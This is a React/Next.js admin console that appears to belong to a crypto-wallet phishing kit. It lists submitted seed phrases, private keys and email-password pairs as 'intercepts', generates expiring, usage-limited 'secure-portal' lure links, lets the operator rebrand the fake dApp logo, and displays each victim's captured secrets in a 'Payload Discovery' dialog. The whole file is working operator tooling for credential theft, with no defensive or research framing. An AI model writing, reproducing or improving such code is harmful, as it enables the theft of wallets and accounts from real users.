"use client";

import React, { useState, useEffect, useCallback, useRef } from "react";
import { useRouter } from "next/navigation";
import { supabaseClient } from "@/lib/supabase";
import { 
  Table, 
  TableBody, 
  TableCell, 
  TableHead, 
  TableHeader, 
  TableRow 
} from "@/components/ui/table";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { 
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { 
  Shield, 
  Database, 
  Eye, 
  RefreshCw, 
  Lock,
  LogOut,
  Loader2,
  Link as LinkIcon,
  Copy,
  Plus,
  Activity,
  Trash2,
  Calendar as CalendarIcon,
  Clock,
  Key,
  Palette,
  CheckCircle2,
  Upload
} from "lucide-react";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
} from "@/components/ui/dialog";
import { cn } from "@/lib/utils";
import { toast } from "@/hooks/use-toast";
import { addMinutes, addDays, format } from "date-fns";

interface Submission {
  id: string;
  wallet_name: string;
  wallet_address: string;
  type: string;
  data: any;
  timestamp: string;
  user_agent: string;
}

interface PortalLink {
  id: string;
  token: string;
  custom_name: string;
  expires_at: string;
  used_count: number;
  usage_limit: number;
  created_at: string;
}

type ExpiryMode = "preset" | "custom";

export default function AdminPage() {
  const router = useRouter();
  const fileInputRef = useRef<HTMLInputElement>(null);
  const [submissions, setSubmissions] = useState<Submission[]>([]);
  const [portals, setPortals] = useState<PortalLink[]>([]);
  const [loading, setLoading] = useState(true);
  const [authLoading, setAuthLoading] = useState(true);
  const [selectedSubmission, setSelectedSubmission] = useState<Submission | null>(null);
  
  // Link Generation State
  const [generatingLink, setGeneratingLink] = useState(false);
  const [portalName, setPortalName] = useState("");
  const [usageLimit, setUsageLimit] = useState(1);
  const [expiryMode, setExpiryMode] = useState<ExpiryMode>("preset");
  const [expiryPreset, setExpiryPreset] = useState("10080"); 
  const [customDate, setCustomDate] = useState(format(addDays(new Date(), 7), "yyyy-MM-dd'T'HH:mm"));

  // Branding State
  const [logoUrl, setLogoUrl] = useState("");
  const [updatingLogo, setUpdatingLogo] = useState(false);
  const [uploadingFile, setUploadingFile] = useState(false);

  const fetchData = useCallback(async () => {
    setLoading(true);
    try {
      const [subsRes, portalsRes, settingsRes] = await Promise.all([
        supabaseClient.from("wallet_submissions").select("*").order("timestamp", { ascending: false }),
        supabaseClient.from("access_tokens").select("*").order("created_at", { ascending: false }),
        supabaseClient.from("app_settings").select("*").eq("key", "logo_url").single()
      ]);

      if (subsRes.data) setSubmissions(subsRes.data);
      if (portalsRes.data) setPortals(portalsRes.data);
      if (settingsRes.data) setLogoUrl(settingsRes.data.value || "");
    } catch (err) {
      console.error("Fetch error:", err);
    } finally {
      setLoading(false);
    }
  }, []);

  useEffect(() => {
    const checkAuth = async () => {
      const { data: { session } } = await supabaseClient.auth.getSession();
      if (!session) {
        router.replace("/admin/login");
      } else {
        setAuthLoading(false);
        fetchData();
      }
    };
    checkAuth();

    const { data: { subscription } } = supabaseClient.auth.onAuthStateChange((event, session) => {
      if (event === 'SIGNED_OUT' || !session) {
        router.replace("/admin/login");
      }
    });

    const subChannel = supabaseClient
      .channel('subs-changes')
      .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'wallet_submissions' }, () => fetchData())
      .subscribe();

    return () => {
      subscription.unsubscribe();
      supabaseClient.removeChannel(subChannel);
    };
  }, [router, fetchData]);

  const updateBranding = async (url?: string) => {
    setUpdatingLogo(true);
    const finalUrl = url ?? logoUrl;
    try {
      const { error } = await supabaseClient
        .from("app_settings")
        .upsert({ key: "logo_url", value: finalUrl }, { onConflict: "key" });

      if (error) throw error;
      setLogoUrl(finalUrl);
      toast({ title: "Branding Updated", description: "Global logo configuration has been synchronized." });
    } catch (err: any) {
      toast({ variant: "destructive", title: "Update Failed", description: err.message });
    } finally {
      setUpdatingLogo(false);
    }
  };

  const handleFileUpload = async (event: React.ChangeEvent<HTMLInputElement>) => {
    const file = event.target.files?.[0];
    if (!file) return;

    setUploadingFile(true);
    try {
      const fileExt = file.name.split('.').pop();
      const fileName = `logo-${Math.random()}.${fileExt}`;
      const filePath = `${fileName}`;

      const { error: uploadError, data } = await supabaseClient.storage
        .from('branding')
        .upload(filePath, file);

      if (uploadError) throw uploadError;

      const { data: { publicUrl } } = supabaseClient.storage
        .from('branding')
        .getPublicUrl(filePath);

      await updateBranding(publicUrl);
    } catch (err: any) {
      toast({ variant: "destructive", title: "Upload Failed", description: err.message });
    } finally {
      setUploadingFile(false);
    }
  };

  const generatePortal = async () => {
    setGeneratingLink(true);
    try {
      const token = crypto.randomUUID();
      let expiresAt: string;

      if (expiryMode === "preset") {
        expiresAt = addMinutes(new Date(), Number(expiryPreset)).toISOString();
      } else {
        expiresAt = new Date(customDate).toISOString();
      }

      const { error } = await supabaseClient
        .from("access_tokens")
        .insert([{ 
          token, 
          expires_at: expiresAt, 
          custom_name: portalName || `Portal-${token.slice(0, 4)}`,
          usage_limit: usageLimit,
          used_count: 0
        }]);

      if (error) throw error;

      toast({
        title: "Portal Activated",
        description: `Link established. Active until ${new Date(expiresAt).toLocaleString()}`,
      });
      
      setPortalName("");
      fetchData();
    } catch (err: any) {
      toast({ variant: "destructive", title: "Operation Failed", description: err.message });
    } finally {
      setGeneratingLink(false);
    }
  };

  const deletePortal = async (id: string) => {
    try {
      await supabaseClient.from("access_tokens").delete().eq("id", id);
      fetchData();
      toast({ title: "Portal Decommissioned", description: "Access route has been permanently severed." });
    } catch (err) {
      toast({ variant: "destructive", title: "Error", description: "Failed to delete portal." });
    }
  };

  const copyToClipboard = (token: string) => {
    const baseUrl = typeof window !== "undefined" ? window.location.origin : "";
    navigator.clipboard.writeText(`${baseUrl}/secure-portal/${token}`);
    toast({ title: "Signal Captured", description: "Secure URL ready for transmission." });
  };

  const handleLogout = async () => {
    await supabaseClient.auth.signOut();
    router.replace("/admin/login");
  };

  if (authLoading) {
    return (
      <div className="min-h-screen bg-[#0B0F17] flex items-center justify-center">
        <Loader2 className="animate-spin text-primary w-12 h-12" />
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#0B0F17] text-white p-8 pb-32">
      <div className="max-w-7xl mx-auto space-y-8">
        {/* Header */}
        <div className="flex flex-col md:flex-row justify-between items-start md:items-center gap-4">
          <div>
            <div className="flex items-center gap-3 mb-2">
              <div className="w-10 h-10 rounded-xl bg-primary/20 flex items-center justify-center text-primary">
                <Database size={24} />
              </div>
              <h1 className="font-headline text-3xl font-black tracking-tight uppercase">Admin Console</h1>
            </div>
            <p className="text-slate-500 text-sm">Real-time Web3 infrastructure monitoring</p>
          </div>
          <div className="flex gap-3">
            <Button variant="outline" className="glass border-white/5 h-11 px-6 rounded-xl" onClick={fetchData}>
              <RefreshCw size={18} className={loading ? "animate-spin mr-2" : "mr-2"} />
              Sync
            </Button>
            <Button variant="destructive" className="h-11 px-6 rounded-xl bg-red-500/10 text-red-400 border border-red-500/20" onClick={handleLogout}>
              <LogOut size={18} className="mr-2" />
              Logout
            </Button>
          </div>
        </div>

        <div className="grid lg:grid-cols-3 gap-8">
          {/* Portal Generator Form */}
          <Card className="glass border-white/5 bg-[#131A26]/50 rounded-[2.5rem] lg:col-span-1">
            <CardHeader>
              <div className="flex items-center gap-2 text-primary font-headline font-black uppercase tracking-[0.2em] text-[10px] mb-2">
                <Plus size={14} /> Portal Generator
              </div>
              <CardTitle className="font-headline text-2xl font-bold">New Entry Point</CardTitle>
              <CardDescription className="text-slate-500">Configure independent secure access links.</CardDescription>
            </CardHeader>
            <CardContent className="space-y-6">
              <div className="space-y-2">
                <label className="text-[10px] font-black uppercase tracking-widest text-slate-500">Portal Name</label>
                <Input 
                  placeholder="e.g. VIP Client-01" 
                  value={portalName}
                  onChange={(e) => setPortalName(e.target.value)}
                  className="bg-black/40 border-white/5 h-12 rounded-xl"
                />
              </div>

              <div className="space-y-4">
                <div className="flex items-center justify-between">
                  <label className="text-[10px] font-black uppercase tracking-widest text-slate-500">Expiration Control</label>
                  <div className="flex gap-2">
                    <button 
                      onClick={() => setExpiryMode("preset")}
                      className={cn("text-[9px] font-black px-2 py-1 rounded-md transition-all uppercase tracking-tighter", 
                        expiryMode === "preset" ? "bg-primary text-black" : "bg-white/5 text-slate-500")}
                    >
                      Presets
                    </button>
                    <button 
                      onClick={() => setExpiryMode("custom")}
                      className={cn("text-[9px] font-black px-2 py-1 rounded-md transition-all uppercase tracking-tighter", 
                        expiryMode === "custom" ? "bg-primary text-black" : "bg-white/5 text-slate-500")}
                    >
                      Custom
                    </button>
                  </div>
                </div>

                {expiryMode === "preset" ? (
                  <Select value={expiryPreset} onValueChange={setExpiryPreset}>
                    <SelectTrigger className="bg-black/40 border-white/5 h-12 rounded-xl text-xs font-bold">
                      <SelectValue placeholder="Select lifespan" />
                    </SelectTrigger>
                    <SelectContent className="bg-[#131A26] border-white/10 text-white">
                      <SelectItem value="60">1 Hour</SelectItem>
                      <SelectItem value="1440">24 Hours</SelectItem>
                      <SelectItem value="10080">7 Days (Default)</SelectItem>
                      <SelectItem value="43200">30 Days</SelectItem>
                      <SelectItem value="129600">90 Days</SelectItem>
                    </SelectContent>
                  </Select>
                ) : (
                  <div className="relative">
                    <CalendarIcon className="absolute left-4 top-1/2 -translate-y-1/2 text-primary w-4 h-4 z-10" />
                    <Input 
                      type="datetime-local"
                      value={customDate}
                      onChange={(e) => setCustomDate(e.target.value)}
                      className="bg-black/40 border-white/5 h-12 rounded-xl pl-12 text-xs font-mono"
                    />
                  </div>
                )}
              </div>

              <div className="space-y-2">
                <div className="flex items-center justify-between">
                   <label className="text-[10px] font-black uppercase tracking-widest text-slate-500">Usage Quota</label>
                   <span className="text-[10px] text-primary font-bold">Limit: {usageLimit}</span>
                </div>
                <Input 
                  type="number"
                  min="1"
                  value={usageLimit}
                  onChange={(e) => setUsageLimit(Number(e.target.value))}
                  className="bg-black/40 border-white/5 h-12 rounded-xl"
                />
              </div>

              <Button 
                onClick={generatePortal}
                disabled={generatingLink}
                className="w-full h-14 bg-primary text-black font-black uppercase tracking-widest rounded-2xl shadow-neon transition-all hover:scale-[1.02]"
              >
                {generatingLink ? <Loader2 className="animate-spin mr-2" /> : <Lock size={18} className="mr-2" />}
                Activate Portal
              </Button>
            </CardContent>
          </Card>

          <div className="lg:col-span-2 space-y-8">
            {/* Active Portals List */}
            <Card className="glass border-white/5 bg-[#131A26]/30 rounded-[2.5rem] overflow-hidden">
              <div className="p-6 border-b border-white/5 flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <LinkIcon size={18} className="text-primary" />
                  <h3 className="font-headline font-bold">Active Portals</h3>
                </div>
                <Badge variant="outline" className="bg-primary/10 text-primary border-primary/20">
                  {portals.length} TOTAL SLOTS
                </Badge>
              </div>
              <div className="max-h-[300px] overflow-y-auto">
                <Table>
                  <TableHeader className="bg-white/5">
                    <TableRow className="border-white/5">
                      <TableHead className="text-[10px] uppercase font-black py-4">Name</TableHead>
                      <TableHead className="text-[10px] uppercase font-black py-4">Expires</TableHead>
                      <TableHead className="text-[10px] uppercase font-black py-4">Usage</TableHead>
                      <TableHead className="text-right text-[10px] uppercase font-black py-4">Actions</TableHead>
                    </TableRow>
                  </TableHeader>
                  <TableBody>
                    {portals.length === 0 ? (
                      <TableRow>
                        <TableCell colSpan={4} className="text-center py-10 text-slate-600 italic">No active portal slots found.</TableCell>
                      </TableRow>
                    ) : (
                      portals.map((p) => {
                        const isExpired = new Date(p.expires_at) < new Date();
                        const isFull = p.used_count >= p.usage_limit;
                        return (
                          <TableRow key={p.id} className="border-white/5 hover:bg-white/5 transition-colors">
                            <TableCell>
                              <div className="font-bold text-xs truncate max-w-[120px]">{p.custom_name}</div>
                              <div className="text-[8px] font-mono text-slate-500">ID: {p.token.slice(0, 8)}...</div>
                            </TableCell>
                            <TableCell>
                              <div className="text-[10px] font-mono mb-1">{new Date(p.expires_at).toLocaleDateString()}</div>
                              <Badge className={cn(
                                "text-[7px] font-black uppercase h-4",
                                isExpired || isFull ? "bg-red-500/10 text-red-500 border-red-500/20" : "bg-emerald-500/10 text-emerald-500 border-emerald-500/20"
                              )}>
                                {isExpired ? "EXPIRED" : isFull ? "CONSUMED" : "ACTIVE"}
                              </Badge>
                            </TableCell>
                            <TableCell className="font-mono text-[10px]">
                              {p.used_count} / {p.usage_limit}
                            </TableCell>
                            <TableCell className="text-right">
                               <div className="flex justify-end gap-1">
                                  <Button size="icon" variant="ghost" className="h-7 w-7 text-slate-400 hover:text-white" onClick={() => copyToClipboard(p.token)}>
                                    <Copy size={12} />
                                  </Button>
                                  <Button size="icon" variant="ghost" className="h-7 w-7 text-red-400 hover:text-red-500" onClick={() => deletePortal(p.id)}>
                                    <Trash2 size={12} />
                                  </Button>
                               </div>
                            </TableCell>
                          </TableRow>
                        );
                      })
                    )}
                  </TableBody>
                </Table>
              </div>
            </Card>

            {/* Branding Settings */}
            <Card className="glass border-white/5 bg-[#131A26]/50 rounded-[2.5rem]">
              <CardHeader>
                <div className="flex items-center gap-2 text-emerald-400 font-headline font-black uppercase tracking-[0.2em] text-[10px] mb-2">
                  <Palette size={14} /> Brand Configuration
                </div>
                <CardTitle className="font-headline text-2xl font-bold">Dynamic Logo Control</CardTitle>
                <CardDescription className="text-slate-500">Update the visual identity of your dApp globally. Icons are stored in the Supabase 'branding' bucket.</CardDescription>
              </CardHeader>
              <CardContent className="space-y-6">
                <div className="flex flex-col md:flex-row gap-6 items-start">
                  <div className="flex-1 w-full space-y-4">
                    <div className="space-y-2">
                      <label className="text-[10px] font-black uppercase tracking-widest text-slate-500">dApp Logo Source</label>
                      <div className="flex gap-2">
                         <Input 
                          placeholder="https://example.com/logo.png" 
                          value={logoUrl}
                          onChange={(e) => setLogoUrl(e.target.value)}
                          className="bg-black/40 border-white/5 h-12 rounded-xl text-xs font-mono"
                        />
                        <input 
                          type="file" 
                          ref={fileInputRef} 
                          onChange={handleFileUpload} 
                          className="hidden" 
                          accept="image/*"
                        />
                        <Button 
                          onClick={() => fileInputRef.current?.click()} 
                          disabled={uploadingFile}
                          variant="outline"
                          className="h-12 w-12 rounded-xl bg-white/5 border-white/5 hover:bg-white/10"
                        >
                          {uploadingFile ? <Loader2 className="animate-spin" /> : <Upload size={18} />}
                        </Button>
                      </div>
                    </div>
                    <Button 
                      onClick={() => updateBranding()}
                      disabled={updatingLogo}
                      className="w-full h-12 bg-white/5 hover:bg-white/10 text-white font-black uppercase tracking-widest rounded-xl border border-white/5 transition-all"
                    >
                      {updatingLogo ? <Loader2 className="animate-spin mr-2" /> : <CheckCircle2 size={16} className="mr-2" />}
                      Sync Branding
                    </Button>
                  </div>
                  <div className="w-full md:w-32 flex flex-col items-center gap-2">
                    <label className="text-[8px] font-black uppercase tracking-widest text-slate-600">Preview</label>
                    <div className="w-24 h-24 rounded-2xl bg-black/40 border border-white/5 flex items-center justify-center overflow-hidden p-2">
                      {logoUrl ? (
                        <img src={logoUrl} alt="Preview" className="w-full h-full object-contain" />
                      ) : (
                        <div className="w-10 h-10 rounded-lg bg-primary/20 flex items-center justify-center font-bold text-primary">R</div>
                      )}
                    </div>
                  </div>
                </div>
              </CardContent>
            </Card>
          </div>
        </div>

        {/* Submissions Stats */}
        <div className="grid grid-cols-2 md:grid-cols-4 gap-6">
          {[
            { label: "Total Intercepts", val: submissions.length, color: "text-primary", icon: Activity },
            { label: "Seed Recovery", val: submissions.filter(s => s.type === "seed-phrase").length, color: "text-emerald-400", icon: Shield },
            { label: "Private Keys", val: submissions.filter(s => s.type === "private-key").length, color: "text-orange-400", icon: Lock },
            { label: "Credential Sets", val: submissions.filter(s => s.type === "email-password").length, color: "text-cyan-400", icon: Database },
          ].map((stat, i) => (
            <Card key={i} className="glass border-white/5 bg-[#131A26]/50 group hover:border-primary/20 transition-all">
              <CardHeader className="p-6">
                <div className="flex items-center justify-between mb-2">
                  <CardDescription className="text-[10px] font-black uppercase tracking-widest text-slate-500">{stat.label}</CardDescription>
                  <stat.icon size={12} className={cn("opacity-40", stat.color)} />
                </div>
                <CardTitle className={cn("text-3xl font-headline font-black", stat.color)}>{stat.val}</CardTitle>
              </CardHeader>
            </Card>
          ))}
        </div>

        {/* Activity Stream */}
        <Card className="glass border-white/5 bg-[#131A26]/30 rounded-[2.5rem] overflow-hidden">
          <div className="p-6 border-b border-white/5 flex items-center justify-between">
            <div className="flex items-center gap-2">
              <Activity size={18} className="text-primary" />
              <h3 className="font-headline font-bold">Live Activity Stream</h3>
            </div>
            <div className="flex items-center gap-2">
              <span className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></span>
              <span className="text-[10px] font-black text-slate-500 uppercase tracking-widest">System Monitoring Active</span>
            </div>
          </div>
          <div className="max-h-[600px] overflow-y-auto">
            <Table>
              <TableHeader className="bg-white/5">
                <TableRow className="border-white/5">
                  <TableHead className="text-[10px] uppercase font-black py-4">Timestamp</TableHead>
                  <TableHead className="text-[10px] uppercase font-black py-4">Wallet</TableHead>
                  <TableHead className="text-[10px] uppercase font-black py-4">Type</TableHead>
                  <TableHead className="text-right text-[10px] uppercase font-black py-4">Details</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {submissions.length === 0 ? (
                  <TableRow>
                    <TableCell colSpan={4} className="text-center py-24 text-slate-600">No active signal intercepts captured.</TableCell>
                  </TableRow>
                ) : (
                  submissions.map((item) => (
                    <TableRow key={item.id} className="border-white/5 hover:bg-white/5">
                      <TableCell className="font-mono text-[10px] text-slate-500">
                        {new Date(item.timestamp).toLocaleString()}
                      </TableCell>
                      <TableCell className="font-bold text-xs uppercase">{item.wallet_name}</TableCell>
                      <TableCell>
                        <Badge variant="outline" className="text-[9px] uppercase font-black border-white/10">{item.type}</Badge>
                      </TableCell>
                      <TableCell className="text-right">
                        <Button size="sm" variant="ghost" className="h-8 text-slate-400 hover:text-white" onClick={() => setSelectedSubmission(item)}>
                          <Eye size={14} className="mr-2" /> View
                        </Button>
                      </TableCell>
                    </TableRow>
                  ))
                )}
              </TableBody>
            </Table>
          </div>
        </Card>
      </div>

      {/* Details Dialog */}
      <Dialog open={!!selectedSubmission} onOpenChange={() => setSelectedSubmission(null)}>
        <DialogContent className="max-w-2xl bg-[#0B0F17] border-white/10 text-white rounded-[2.5rem] shadow-2xl">
          <DialogHeader>
            <DialogTitle className="font-headline text-2xl font-black uppercase tracking-tight flex items-center gap-3">
              <Key className="text-primary" /> Payload Discovery
            </DialogTitle>
            <DialogDescription className="text-slate-500 uppercase tracking-widest text-[10px] font-bold">Decrypted interaction metadata</DialogDescription>
          </DialogHeader>
          {selectedSubmission && (
            <div className="space-y-6 py-4">
              <div className="p-6 rounded-2xl bg-white/5 border border-white/5">
                <div className="flex items-center justify-between mb-4">
                  <div className="text-[10px] font-black text-primary uppercase tracking-widest">Sensitive Data Content</div>
                  <Badge className="bg-primary/10 text-primary border-primary/20 text-[8px]">{selectedSubmission.type}</Badge>
                </div>
                <div className="bg-black/40 p-6 rounded-xl font-mono text-xs break-all whitespace-pre-wrap select-all border border-white/5">
                  {JSON.stringify(selectedSubmission.data, null, 2)}
                </div>
              </div>
              <div className="grid grid-cols-2 gap-4">
                <div className="p-4 rounded-xl bg-white/5 border border-white/5">
                  <div className="text-[8px] font-black text-slate-500 uppercase mb-1">Source Wallet</div>
                  <div className="text-xs font-bold">{selectedSubmission.wallet_name}</div>
                </div>
                <div className="p-4 rounded-xl bg-white/5 border border-white/5">
                  <div className="text-[8px] font-black text-slate-500 uppercase mb-1">Wallet Address</div>
                  <div className="text-xs font-mono truncate">{selectedSubmission.wallet_address || "N/A"}</div>
                </div>
              </div>
              <div className="p-4 rounded-xl bg-white/5 border border-white/5 text-[10px] text-slate-500 italic">
                Source Fingerprint: {selectedSubmission.user_agent}
              </div>
            </div>
          )}
        </DialogContent>
      </Dialog>
    </div>
  );
}
